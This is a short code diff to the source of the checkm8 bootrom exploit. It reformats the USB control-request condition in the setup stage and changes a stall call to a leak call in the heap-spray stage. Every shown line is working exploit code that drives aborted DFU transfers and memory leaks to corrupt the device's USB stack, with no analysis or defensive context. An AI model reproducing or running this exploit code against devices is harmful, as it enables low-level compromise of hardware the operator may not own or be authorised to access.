@@ -884,7 +884,10 @@ checkm8_stage_setup(const usb_handle_t *handle) {
 	transfer_ret_t transfer_ret;
 
 	for(;;) {
-		if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < config_overwrite_pad && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
+		if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret)
+		 && transfer_ret.sz < config_overwrite_pad
+		 && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret)
+		 && transfer_ret.ret == USB_TRANSFER_STALL) {
 			return true;
 		}
 		send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
@@ -944,7 +947,7 @@ checkm8_stage_spray(const usb_handle_t *handle) {
 		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
 	} else {
 		for(i = 0; i < config_large_leak; ++i) {
-			while(!checkm8_usb_request_stall(handle)) {}
+			while(!checkm8_usb_request_leak(handle)) {}
 		}
 		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
 	}
